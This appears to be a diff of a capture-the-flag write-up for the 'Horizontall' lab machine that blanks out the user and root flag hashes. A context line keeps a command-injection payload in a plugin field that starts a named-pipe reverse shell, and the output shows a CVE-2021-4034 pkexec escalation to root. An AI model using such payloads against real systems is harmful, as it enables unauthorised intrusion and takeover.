@@ -77,7 +77,7 @@ data = '{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh
 [+]USERFLAG[+]
 strapi@horizontall:/home/developer$ cat user.txt
 cat user.txt
-a1fe246f1ea84768e5f8c0e7d6843c88
+
 
 
 [+]PRIVILAGE ESCALATION[+] CVE-2021-4034 - Pkexec Local Privilege Escalation
@@ -101,4 +101,4 @@ root@horizontall:/dev/shm# id
 uid=0(root) gid=0(root) groups=0(root),1001(strapi)
 
 root@horizontall:/dev/shm# cat /root/root.txt 
-b9ce0abad0affbb394806fcf4c3b297d
+
